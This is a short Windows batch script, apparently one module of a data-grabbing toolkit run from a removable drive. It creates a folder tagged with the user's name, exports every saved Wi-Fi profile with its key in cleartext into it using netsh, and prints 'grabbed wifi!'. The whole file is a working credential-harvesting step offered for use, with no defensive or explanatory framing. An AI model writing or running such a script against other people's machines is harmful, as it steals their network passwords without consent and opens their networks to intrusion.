@echo off
%current_drive%
set wlan_folder=%dump_data_path%\wlan_grab\%Username%_%random%_%random%
md %dump_data_path%\wlan_grab
md %wlan_folder%
%Homedrive%
cd %SystemRoot%\System32
echo %SystemRoot%\System32
echo %CD%
netsh wlan export profile folder=%wlan_folder% key=clear
echo grabbed wifi!